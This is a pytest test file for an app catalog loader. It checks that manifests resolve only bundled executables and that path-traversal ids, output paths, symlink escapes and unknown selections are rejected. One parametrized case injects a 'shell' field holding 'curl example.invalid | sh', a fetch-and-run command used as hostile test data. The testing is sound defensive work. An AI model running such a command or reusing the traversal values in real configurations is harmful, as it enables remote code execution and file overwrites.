from __future__ import annotations

import json
from pathlib import Path

import pytest
from manager.catalog import CatalogError, load_catalog, select_apps


def manifest(app_id: str = "sample") -> dict:
    return {
        "id": app_id,
        "name": "Sample",
        "version": "1",
        "description": "Test fixture",
        "entrypoint": ["run.py", "--fixture"],
        "default_enabled": False,
        "required_capabilities": [],
        "input_contracts": ["fixture.v1"],
        "output_files": ["events.jsonl"],
        "extra_context_profiles": ["context"],
    }


def build_catalog(tmp_path: Path, raw: dict | None = None):
    catalog_dir = tmp_path / "catalog"
    apps_root = tmp_path / "apps"
    requested_id = (raw or manifest())["id"]
    app_id = requested_id if requested_id == "sample" else "sample"
    app_dir = apps_root / app_id
    catalog_dir.mkdir()
    app_dir.mkdir(parents=True)
    executable = app_dir / "run.py"
    executable.write_text("#!/usr/bin/env python3\n", encoding="utf-8")
    executable.chmod(0o755)
    (catalog_dir / "sample.json").write_text(json.dumps(raw or manifest()), encoding="utf-8")
    return catalog_dir, apps_root


def test_catalog_resolves_only_bundled_executable(tmp_path: Path):
    catalog_dir, apps_root = build_catalog(tmp_path)
    catalog = load_catalog(catalog_dir, apps_root)
    item = catalog["sample"]
    assert item.command == (str(apps_root / "sample" / "run.py"), "--fixture")
    assert item.default_enabled is False


@pytest.mark.parametrize(
    "mutation",
    [
        lambda raw: raw.update(id="../escape"),
        lambda raw: raw.update(entrypoint=["../run.py"]),
        lambda raw: raw.update(output_files=["../../configuration.yaml"]),
        lambda raw: raw.update(extra_context_profiles=["arbitrary"]),
        lambda raw: raw.update(shell="curl example.invalid | sh"),
    ],
)
def test_catalog_rejects_untrusted_manifest_fields(tmp_path: Path, mutation):
    raw = manifest()
    mutation(raw)
    catalog_dir, apps_root = build_catalog(tmp_path, raw)
    with pytest.raises((CatalogError, ValueError)):
        load_catalog(catalog_dir, apps_root)


def test_catalog_rejects_symlink_escape(tmp_path: Path):
    catalog_dir = tmp_path / "catalog"
    apps_root = tmp_path / "apps"
    outside = tmp_path / "outside"
    catalog_dir.mkdir()
    apps_root.mkdir()
    outside.mkdir()
    executable = outside / "run.py"
    executable.write_text("#!/usr/bin/env python3\n", encoding="utf-8")
    executable.chmod(0o755)
    (apps_root / "sample").symlink_to(outside, target_is_directory=True)
    (catalog_dir / "sample.json").write_text(json.dumps(manifest()), encoding="utf-8")
    with pytest.raises((CatalogError, ValueError)):
        load_catalog(catalog_dir, apps_root)


def test_requested_ids_are_unique_and_known(tmp_path: Path):
    catalog_dir, apps_root = build_catalog(tmp_path)
    catalog = load_catalog(catalog_dir, apps_root)
    assert [item.id for item in select_apps(catalog, ["sample"])] == ["sample"]
    with pytest.raises(CatalogError, match="duplicate"):
        select_apps(catalog, ["sample", "sample"])
    with pytest.raises(CatalogError, match="unknown"):
        select_apps(catalog, ["not_bundled"])
